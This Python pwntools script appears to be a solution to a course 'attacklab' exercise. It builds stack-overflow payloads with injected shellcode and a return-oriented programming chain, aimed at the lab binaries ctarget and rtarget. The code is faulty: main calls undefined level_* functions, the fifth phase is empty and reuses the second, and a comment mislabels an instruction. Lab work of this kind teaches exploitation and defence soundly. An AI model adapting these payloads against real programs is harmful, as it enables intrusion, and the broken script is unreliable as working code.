#!/usr/bin/python
from pwn import *
"""
attacklab: classic shellcode injection and ROP
"""
TOUCH_1 = 0x04017c0
TOUCH_2 = 0x04017ec
TOUCH_3 = 0x04018fa

OFFSET = 40

COOKIE = 0x59b997fa
BUFFER = 0x5561dc78
STRING = 0x5561dcb0

## classic code injection

def phase_one():
    """
    41 41 41 41 41 41 41 41 41 41  ; 40 bytes to overwrite
    41 41 41 41 41 41 41 41 41 41
    41 41 41 41 41 41 41 41 41 41
    41 41 41 41 41 41 41 41 41 41
    c0 17 40 00 00 00 00 00 00 00  ; address of touch1
    """
    payload = ""
    payload += "A" * OFFSET
    payload += p64(TOUCH_1)
    return payload


def phase_two():
    """
    48 c7 c7 fa 97 b9 59 c3 41 41  ; mov rdi, 0x59b997fa; ret // place cookie as first arg
    41 41 41 41 41 41 41 41 41 41
    41 41 41 41 41 41 41 41 41 41
    41 41 41 41 41 41 41 41 41 41
    41 41 78 DC 61 55 00 00 00 00  ; address of start of buffer
    EC 17 40 00 00 00 00 00 00 00  ; address of touch2
    """
    payload = ""
    payload += asm("mov rdi, {}; ret".format(COOKIE), bits=64)
    payload += "A" * (OFFSET - len(payload))
    payload += p64(BUFFER)
    payload += p64(TOUCH_2)
    return payload


def hextostring(data):
    return "".join([x for x in hex(data)[2:]])

def phase_three():
    """
    48 c7 c7 b0 dc 61 55 c3 41 41  ; mov rdi, 0x59b997fa; ret // place ptr to cookie as first arg
    41 41 41 41 41 41 41 41 41 41
    41 41 41 41 41 41 41 41 41 41
    41 41 41 41 41 41 41 41 41 41
    41 41 78 DC 61 55 00 00 00 00  ; address of start of buffer
    FA 18 40 00 00 00 00 00 00     ; address of touch3
    35 39 62 39 39 37 66 61 00     ; cookie as string
    """
    payload = ""
    payload += asm("mov rdi, {}; ret".format(STRING), bits=64)
    payload += "A" * (OFFSET - len(payload))
    payload += p64(BUFFER)
    payload += p64(TOUCH_3)
    payload += hextostring(COOKIE)
    return payload


## ROP

def phase_four():
    """
    41 41 41 41 41 41 41 41 41 41 41
    41 41 41 41 41 41 41 41 41 41 41
    41 41 41 41 41 41 41 41 41 41 41
    41 41 41 41 41 41 41 1B 14 40 00  # pop rdi ; ret;
    00 00 00 00 FA 97 B9 59 00 00 00  # address of cookie
    00 EC 17 40 00 00 00 00 00        # address of touch2
    """
    payload = ""
    payload += "A" * OFFSET
    payload += p64(0x0040141b)  # pop rdi; ret
    payload += p64(COOKIE)
    payload += p64(TOUCH_2)
    return payload


def phase_five():
    payload = ""
    return payload


def main():
    # phase one
    io = process(argv=["./ctarget", "-q"])
    io.sendline(level_one())
    print io.recvall()

    # phase two
    io = process(argv=["./ctarget", "-q"])
    io.sendline(level_two())
    print io.recvall()

    # phase three
    io = process(argv=["./ctarget", "-q"])
    io.sendline(level_three())
    print io.recvall()

    # phase four
    io = process(argv=["./rtarget", "-q"])
    io.sendline(level_four())
    print io.recvall()

    # phase five
    io = process(argv=["./rtarget", "-q"])
    io.sendline(level_two())
    print io.recvall()

if __name__ == "__main__":
    main()

